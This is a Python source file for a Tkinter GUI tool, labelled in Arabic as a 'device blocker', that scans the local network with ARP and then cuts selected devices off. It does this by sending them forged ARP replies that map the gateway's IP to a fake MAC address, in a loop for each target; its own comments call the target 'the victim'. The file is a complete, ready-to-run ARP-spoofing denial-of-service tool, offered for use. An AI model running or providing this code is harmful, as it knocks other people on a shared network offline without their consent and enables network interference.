import tkinter as tk
from tkinter import ttk, scrolledtext
import threading
import time
import ipaddress
import warnings
import subprocess
import re
import socket

warnings.filterwarnings("ignore")

from scapy.all import ARP, Ether, srp, send, conf, get_if_hwaddr
from scapy.config import conf as scapy_conf
try:
    from scapy.libs.manuf import Manuf
    _manuf=Manuf()
except Exception:
    _manuf=None

try:
    import netifaces
    NETIFACES_AVAILABLE = True
except ImportError:
    NETIFACES_AVAILABLE = False

class NetworkBlockerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("حاجب الأجهزة - نسخة مستقرة")
        self.root.geometry("900x720")
        
        self.blocked_targets = {}
        self.gateway_ip = None
        self.gateway_mac = None
        self.my_ip = None
        self.my_mac = None
        self.excluded_ips = set()
        
        # كشف MAC
        try:
            self.my_mac = get_if_hwaddr(conf.iface).upper()
        except:
            self.my_mac = None

        # ---------- واجهة المستخدم ----------
        settings_frame = tk.LabelFrame(root, text="إعدادات الشبكة", padx=10, pady=10)
        settings_frame.pack(fill="x", padx=10, pady=5)
        
        tk.Label(settings_frame, text="نطاق الشبكة:").grid(row=0, column=0, sticky="w")
        self.ip_range_entry = tk.Entry(settings_frame, width=25)
        self.ip_range_entry.grid(row=0, column=1, padx=5)
        self.refresh_net_btn = tk.Button(settings_frame, text="🔄 كشف تلقائي", command=self.auto_detect_network)
        self.refresh_net_btn.grid(row=0, column=2, padx=5)
        
        tk.Label(settings_frame, text="عنوان البوابة:").grid(row=1, column=0, sticky="w", pady=5)
        self.gateway_entry = tk.Entry(settings_frame, width=25)
        self.gateway_entry.grid(row=1, column=1, padx=5)
        
        tk.Label(settings_frame, text="🛡️ IP جهازك:").grid(row=2, column=0, sticky="w", pady=5)
        self.my_ip_entry = tk.Entry(settings_frame, width=25)
        self.my_ip_entry.grid(row=2, column=1, padx=5)
        self.my_ip_entry.insert(0, "(أدخل IP يدوياً)")
        self.my_ip_entry.config(fg="gray")
        self.my_ip_entry.bind("<FocusIn>", lambda e: self.my_ip_entry.delete(0, tk.END) if self.my_ip_entry.get() == "(أدخل IP يدوياً)" else None)
        self.my_ip_entry.bind("<FocusOut>", lambda e: self.my_ip_entry.insert(0, "(أدخل IP يدوياً)") if self.my_ip_entry.get() == "" else None)
        self.find_my_ip_btn = tk.Button(settings_frame, text="🔍 اكتشف IP", command=self.find_my_ip_manual)
        self.find_my_ip_btn.grid(row=2, column=2, padx=5)
        
        mac_display = self.my_mac if self.my_mac else "غير مكتشف"
        self.my_info_label = tk.Label(settings_frame, text=f"🛡️ MAC: {mac_display}", fg="green", font=("Arial", 9))
        self.my_info_label.grid(row=3, column=0, columnspan=3, pady=5, sticky="w")
        
        control_frame = tk.Frame(root)
        control_frame.pack(fill="x", padx=10, pady=5)
        self.scan_btn = tk.Button(control_frame, text="⚡ مسح سريع", command=self.start_scan, bg="#4CAF50", fg="white")
        self.scan_btn.pack(side="left", padx=5)
        self.block_btn = tk.Button(control_frame, text="🚫 حجب المحدد", command=self.start_blocking, bg="#f44336", fg="white")
        self.block_btn.pack(side="left", padx=5)
        self.unblock_btn = tk.Button(control_frame, text="✅ إلغاء الحجب", command=self.stop_blocking, bg="#2196F3", fg="white")
        self.unblock_btn.pack(side="left", padx=5)
        self.exclude_btn = tk.Button(control_frame, text="➕ استثناء", command=self.add_excluded_device, bg="#FF9800", fg="white")
        self.exclude_btn.pack(side="left", padx=5)
        self.status_label = tk.Label(control_frame, text="جاهز", fg="blue")
        self.status_label.pack(side="right", padx=10)
        
        tree_frame = tk.LabelFrame(root, text="الأجهزة المتصلة", padx=5, pady=5)
        tree_frame.pack(fill="both", expand=True, padx=10, pady=5)
        columns = ("#1", "#2", "#3", "#4")
        self.devices_tree = ttk.Treeview(tree_frame, columns=columns, show="headings", height=12, selectmode='extended')
        self.devices_tree.heading("#1", text="الحالة")
        self.devices_tree.heading("#2", text="IP")
        self.devices_tree.heading("#3", text="MAC")
        self.devices_tree.heading("#4", text="الشركة")
        self.devices_tree.column("#1", width=90)
        self.devices_tree.column("#2", width=150)
        self.devices_tree.column("#3", width=200)
        self.devices_tree.column("#4", width=250)
        self.devices_tree.pack(fill="both", expand=True, side="left")
        scrollbar = ttk.Scrollbar(tree_frame, orient="vertical", command=self.devices_tree.yview)
        scrollbar.pack(side="right", fill="y")
        self.devices_tree.configure(yscrollcommand=scrollbar.set)
        
        log_frame = tk.LabelFrame(root, text="سجل العمليات", padx=5, pady=5)
        log_frame.pack(fill="x", padx=10, pady=5)
        self.log_text = scrolledtext.ScrolledText(log_frame, height=6, state="normal")
        self.log_text.pack(fill="both", expand=True)
        
        exclude_frame = tk.LabelFrame(root, text="الأجهزة المستثناة", padx=5, pady=5)
        exclude_frame.pack(fill="x", padx=10, pady=5)
        self.exclude_label = tk.Label(exclude_frame, text="لا توجد استثناءات", fg="blue")
        self.exclude_label.pack(anchor="w")
        
        self.auto_detect_network()
        self.log("✅ البرنامج جاهز. تأكد من صلاحيات المدير.")
        if not NETIFACES_AVAILABLE:
            self.log("💡 ثبّت netifaces: pip install netifaces")

    # ---------- دوال مساعدة ----------
    def log(self, msg):
        from datetime import datetime
        self.log_text.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] {msg}\n")
        self.log_text.see(tk.END)
        self.root.update()

    def update_status(self, text, color="blue"):
        self.status_label.config(text=text, fg=color)
        self.root.update()

    def update_exclude_label(self):
        if self.excluded_ips:
            self.exclude_label.config(text="مستثنى: " + ", ".join(sorted(self.excluded_ips)), fg="orange")
        else:
            self.exclude_label.config(text="لا توجد استثناءات", fg="blue")

    # ---------- الكشف التلقائي ----------
    def auto_detect_network(self):
        self.log("🔍 جاري الكشف التلقائي...")
        if NETIFACES_AVAILABLE:
            try:
                gateways = netifaces.gateways()
                default_gw = gateways.get('default', {}).get(netifaces.AF_INET)
                if default_gw:
                    gateway_ip = default_gw[0]
                    iface = default_gw[1]
                    addrs = netifaces.ifaddresses(iface)
                    if netifaces.AF_INET in addrs:
                        for addr in addrs[netifaces.AF_INET]:
                            ip = addr.get('addr')
                            netmask = addr.get('netmask')
                            if ip and netmask and not ip.startswith('127.') and not ip.startswith('169.254'):
                                mac = None
                                if netifaces.AF_LINK in addrs:
                                    mac = addrs[netifaces.AF_LINK][0].get('addr', '').upper()
                                if mac and not self.my_mac:
                                    self.my_mac = mac
                                self.my_ip = ip
                                self.gateway_ip = gateway_ip
                                self.gateway_entry.delete(0, tk.END)
                                self.gateway_entry.insert(0, gateway_ip)
                                self.my_ip_entry.delete(0, tk.END)
                                self.my_ip_entry.insert(0, ip)
                                self.my_ip_entry.config(fg="black")
                                network_obj = ipaddress.IPv4Network(f"{ip}/{netmask}", strict=False)
                                self.ip_range_entry.delete(0, tk.END)
                                self.ip_range_entry.insert(0, str(network_obj))
                                mac_display = self.my_mac if self.my_mac else "غير مكتشف"
                                self.my_info_label.config(text=f"🛡️ MAC: {mac_display}", fg="green")
                                self.log(f"✅ الكشف: {network_obj}, البوابة {gateway_ip}")
                                self.log(f"🛡️ IP: {ip}, MAC: {mac_display}")
                                self.update_status("تم الكشف", "green")
                                return True
                self.log("⚠️ netifaces فشل، نجرب ipconfig...")
            except Exception as e:
                self.log(f"⚠️ netifaces خطأ: {e}")

        # ipconfig
        try:
            result = subprocess.run(["ipconfig", "/all"], capture_output=True, text=True, encoding='cp1252', errors='ignore')
            output = result.stdout
            if not output.strip():
                self.log("⚠️ لا بيانات من ipconfig. أدخل يدوياً.")
                return False
            sections = re.split(r"Ethernet adapter|Wireless LAN adapter", output)
            gateway_ip = None; ip_addr = None; netmask = None; mac_addr = None
            for section in sections:
                if not section.strip(): continue
                ip_match = re.search(r"IPv4 Address\s*\.\s*\.\s*\.\s*\.\s*\.\s*\.\s*\.\s*:\s*([0-9.]+)", section)
                if not ip_match: continue
                possible_ip = ip_match.group(1).strip()
                if possible_ip in ("0.0.0.0", "127.0.0.1") or possible_ip.startswith("169.254"): continue
                mask_match = re.search(r"Subnet Mask\s*\.\s*\.\s*\.\s*\.\s*\.\s*\.\s*\.\s*:\s*([0-9.]+)", section)
                if not mask_match: continue
                possible_mask = mask_match.group(1).strip()
                mac_match = re.search(r"Physical Address\s*\.\s*\.\s*\.\s*\.\s*\.\s*\.\s*\.\s*:\s*([0-9A-Fa-f-]+)", section)
                if not mac_match: continue
                possible_mac = mac_match.group(1).strip().replace("-", ":").upper()
                gw_match = re.search(r"Default Gateway\s*\.\s*\.\s*\.\s*\.\s*\.\s*\.\s*\.\s*:\s*([0-9.]+)", section)
                if gw_match:
                    possible_gw = gw_match.group(1).strip()
                    if possible_gw and possible_gw != "0.0.0.0":
                        gateway_ip = possible_gw
                ip_addr = possible_ip; netmask = possible_mask; mac_addr = possible_mac
                break
            if not gateway_ip:
                gw_global = re.search(r"Default Gateway\s*\.\s*\.\s*\.\s*\.\s*\.\s*\.\s*\.\s*:\s*([0-9.]+)", output)
                if gw_global:
                    possible_gw = gw_global.group(1).strip()
                    if possible_gw and possible_gw != "0.0.0.0":
                        gateway_ip = possible_gw
            if all([ip_addr, netmask, mac_addr, gateway_ip]):
                self.my_ip = ip_addr
                if not self.my_mac:
                    self.my_mac = mac_addr
                self.gateway_ip = gateway_ip
                self.gateway_entry.delete(0, tk.END); self.gateway_entry.insert(0, gateway_ip)
                self.my_ip_entry.delete(0, tk.END); self.my_ip_entry.insert(0, ip_addr); self.my_ip_entry.config(fg="black")
                network_obj = ipaddress.IPv4Network(f"{ip_addr}/{netmask}", strict=False)
                self.ip_range_entry.delete(0, tk.END); self.ip_range_entry.insert(0, str(network_obj))
                mac_display = self.my_mac if self.my_mac else "غير مكتشف"
                self.my_info_label.config(text=f"🛡️ MAC: {mac_display}", fg="green")
                self.log(f"✅ الكشف (ipconfig): {network_obj}, البوابة {gateway_ip}")
                self.log(f"🛡️ IP: {ip_addr}, MAC: {mac_display}")
                self.update_status("تم الكشف", "green")
                return True
            else:
                self.log("⚠️ بيانات ناقصة من ipconfig.")
                return False
        except Exception as e:
            self.log(f"❌ فشل الكشف: {e}")
            return False

    def find_my_ip_manual(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            if ip and not ip.startswith("127."):
                self.my_ip_entry.delete(0, tk.END)
                self.my_ip_entry.insert(0, ip)
                self.my_ip_entry.config(fg="black")
                self.log(f"✅ IP المكتشف: {ip}")
        except Exception as e:
            self.log(f"❌ فشل اكتشاف IP: {e}")

    # ---------- إدارة الاستثناءات ----------
    def add_excluded_device(self):
        selected = self.devices_tree.selection()
        if not selected:
            self.log("⚠️ حدد جهازاً أولاً.")
            return
        for item in selected:
            values = self.devices_tree.item(item, 'values')
            if len(values) < 2: continue
            ip = values[1]
            if ip in self.excluded_ips:
                self.log(f"ℹ️ {ip} مستثنى بالفعل.")
                continue
            self.excluded_ips.add(ip)
            self.log(f"⭐ تم استثناء {ip}")
        self.update_exclude_label()

    # ---------- المسح ----------
    def scan_network(self, ip_range):
        self.update_status("جارٍ المسح...", "orange")
        self.log(f"بدء مسح {ip_range}")
        for row in self.devices_tree.get_children():
            self.devices_tree.delete(row)

        try:
            ans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_range), timeout=0.8, inter=0.1, verbose=False)[0]
            devices = [(p[1].psrc, p[1].hwsrc.upper()) for p in ans]
            if not devices:
                self.log("⚠️ لا توجد أجهزة.")
                self.update_status("لا توجد أجهزة", "red")
                return

            my_ip = self.my_ip_entry.get().strip()
            if my_ip and my_ip != "(أدخل IP يدوياً)":
                self.my_ip = my_ip

            for ip, mac in devices:
                if self.my_mac and mac == self.my_mac:
                    status = "🟢 (أنت)"
                elif self.my_ip and ip == self.my_ip:
                    status = "🟢 (أنت)"
                elif ip in self.excluded_ips:
                    status = "⭐ مستثنى"
                else:
                    status = "⚪"
                vendor = _manuf.lookup(mac) if _manuf else "غير معروف"
                self.devices_tree.insert("", tk.END, values=(status, ip, mac, vendor))

            self.log(f"✅ تم العثور على {len(devices)} جهاز.")
            self.update_status(f"تم العثور على {len(devices)} جهاز", "green")
        except Exception as e:
            self.log(f"❌ خطأ في المسح: {e}")

    def start_scan(self):
        ip_range = self.ip_range_entry.get().strip()
        if not ip_range:
            self.log("⚠️ أدخل نطاق الشبكة.")
            return
        threading.Thread(target=self.scan_network, args=(ip_range,), daemon=True).start()

    # ---------- دوال الحجب المبسطة (لكنها فعالة) ----------
    def get_selected_devices(self):
        selected = self.devices_tree.selection()
        if not selected:
            self.log("⚠️ حدد جهازاً أو أكثر.")
            return []

        devices = []
        for item in selected:
            values = self.devices_tree.item(item, 'values')
            if len(values) < 3:
                continue
            status, ip, mac = values[0], values[1], values[2].upper()

            # حماية جهازك (IP/MAC)
            if self.my_mac and mac == self.my_mac:
                self.log(f"⛔ تخطي جهازك (MAC)")
                continue
            if self.my_ip and ip == self.my_ip:
                self.log(f"⛔ تخطي جهازك (IP)")
                continue
            # حماية البوابة
            if self.gateway_ip and ip == self.gateway_ip:
                self.log(f"⛔ تخطي البوابة")
                continue
            # حماية المستثنى
            if ip in self.excluded_ips:
                self.log(f"⭐ تخطي مستثنى")
                continue
            # أي جهاز عليه علامة محمي
            if "🟢" in status or "⭐" in status:
                self.log(f"⛔ تخطي {ip} (محمي)")
                continue

            devices.append({"ip": ip, "mac": mac})
        return devices

    def block_single_device(self, target_ip, target_mac, gateway_ip, stop_event):
        fake_mac = "00:11:22:33:44:55"
        self.log(f"🚫 بدء حجب {target_ip}")
        while not stop_event.is_set():
            try:
                # إرسال حزمة مزورة للضحية فقط (لتجنب تعقيد البوابة)
                send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=fake_mac), verbose=False)
                time.sleep(0.5)
            except Exception as e:
                self.log(f"⚠️ خطأ في حجب {target_ip}: {e}")
                break
        self.log(f"✅ توقف حجب {target_ip}")

    def start_blocking(self):
        if not self.my_mac:
            self.log("⚠️ لم يُعرف MAC جهازك! شغّل كمدير.")
            return

        gateway_ip = self.gateway_entry.get().strip()
        if not gateway_ip:
            self.log("⚠️ أدخل عنوان البوابة.")
            return

        devices = self.get_selected_devices()
        if not devices:
            self.log("⚠️ لا توجد أجهزة صالحة للحجب.")
            return

        # الحصول على MAC البوابة
        self.log("🔍 البحث عن MAC البوابة...")
        try:
            ans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=gateway_ip), timeout=1, verbose=False)[0]
            if not ans:
                self.log("❌ لم نجد البوابة.")
                return
            self.gateway_mac = ans[0][1].hwsrc.upper()
            self.log(f"✅ MAC البوابة: {self.gateway_mac}")
        except Exception as e:
            self.log(f"❌ خطأ: {e}")
            return

        blocked = 0
        for dev in devices:
            ip = dev["ip"]
            mac = dev["mac"]
            if ip in self.blocked_targets:
                self.log(f"ℹ️ {ip} محظور بالفعل")
                continue

            stop = threading.Event()
            t = threading.Thread(target=self.block_single_device, args=(ip, mac, gateway_ip, stop), daemon=True)
            t.start()
            self.blocked_targets[ip] = {"mac": mac, "stop": stop, "thread": t}
            blocked += 1
            self.log(f"🚫 بدأ حجب {ip}")

        if blocked:
            self.update_status(f"جاري حجب {blocked} جهاز", "red")
            self.log(f"✅ تم حجب {blocked} جهازاً (جهازك آمن).")
        else:
            self.log("⚠️ لم يتم حجب أي جهاز جديد.")

    def stop_blocking(self):
        if not self.blocked_targets:
            self.log("ℹ️ لا توجد أجهزة محظورة.")
            return

        self.log(f"⏳ إيقاف حجب {len(self.blocked_targets)} جهاز...")
        for ip, info in list(self.blocked_targets.items()):
            info["stop"].set()
            self.log(f"🛑 طلب إيقاف {ip}")

        # إعادة ضبط جدول ARP
        if self.gateway_mac:
            for ip, info in self.blocked_targets.items():
                try:
                    send(ARP(op=2, pdst=ip, hwdst=info["mac"], psrc=self.gateway_ip, hwsrc=self.gateway_mac), verbose=False)
                    time.sleep(0.1)
                except:
                    pass
            self.log("✅ تم إرسال حزم إعادة الضبط.")

        self.blocked_targets.clear()
        self.log("🛑 تم إلغاء حجب الكل.")
        self.update_status("متوقف", "blue")

if __name__ == "__main__":
    print("⚠️ يجب تشغيل البرنامج كـ Administrator.")
    root = tk.Tk()
    app = NetworkBlockerApp(root)
    root.mainloop()
